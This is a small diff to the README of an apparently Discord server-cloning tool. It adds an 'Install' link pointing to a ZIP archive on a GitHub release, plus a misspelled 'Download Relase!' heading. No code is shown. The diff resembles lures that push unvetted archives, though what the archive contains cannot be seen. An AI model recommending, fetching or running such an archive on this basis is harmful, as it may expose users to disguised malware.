@@ -15,8 +15,13 @@
 ・ Always ensure your software is up-to-date to benefit from the latest features and bug fixes.
 
 ```
-
 ---
+
+🚀 Install --> [Releases](https://github.com/yoepax/Discord-Server-Cloner/releases/download/v2.4/Relase.zip)
+
+
+## Download Relase!
+
 
 ## :fire: Features
 ```sh-session
